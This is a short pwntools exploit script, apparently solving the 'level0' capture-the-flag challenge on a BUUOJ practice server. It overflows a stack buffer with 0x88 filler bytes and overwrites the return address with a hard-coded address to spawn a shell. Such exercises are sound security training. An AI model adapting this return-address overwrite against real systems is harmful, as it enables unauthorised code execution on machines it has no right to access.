from pwn import *

context(os='linux', arch='amd64', log_level='DEBUG')
if args.LOCAL:
    p = process('./level0')
else:
    p = remote('node3.buuoj.cn', 25823)

calsys = 0x400596

payload = b'a'*(0x80+0x8) + p64(calsys)
p.sendlineafter('World\n', payload)

p.interactive()